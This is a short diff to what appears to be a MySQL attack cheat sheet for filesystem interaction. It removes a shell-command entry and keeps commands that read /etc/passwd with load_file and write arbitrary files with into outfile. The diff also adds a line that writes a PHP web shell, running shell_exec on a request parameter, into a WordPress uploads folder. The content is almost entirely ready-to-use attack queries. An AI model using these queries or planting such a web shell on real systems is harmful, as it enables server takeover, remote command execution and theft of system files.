@@ -66,14 +66,12 @@ set global general_log=0;
 
 # Filesystem interaction
 
-#Execute system shell command
-system 
-
 #Read local file
 select load_file("/etc/passwd")
 
 #write to local file
 select "testing" into outfile '/etc/testing'
+Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
 
 #version
 select @@version
